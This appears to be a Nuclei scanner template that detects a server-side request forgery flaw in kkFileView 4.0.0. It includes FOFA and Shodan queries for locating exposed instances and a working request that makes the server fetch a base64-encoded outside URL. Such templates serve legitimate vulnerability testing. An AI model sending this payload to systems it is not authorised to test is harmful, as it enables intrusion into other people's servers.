id: kkfileview-ssrf

info:
  name: kkFileView 4.0.0 - Server-Side Request Forgery
  author: Arm!tage
  severity: high
  description: |
    kkFileView 4.0.0 is susceptible to server-side request forgery
  reference:
    - https://github.com/kekingcn/kkFileView/issues/296
  classification:
    cwe-id: CWE-918
    cpe: cpe:2.3:a:keking:kkfileview:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    fofa-query: app="kkFileView"
    shodan-query: http.html:"kkFileView"
    verified: true
  tags: ssrf,kkfileview

http:
  - method: GET
    path:
      - "{{BaseURL}}/onlinePreview?url=aHR0cHM6Ly9iYWlkdS5jb20vMS50eHQ="

    matchers:
      - type: word
        part: body
        words:
          - 'hidden id="textData"'
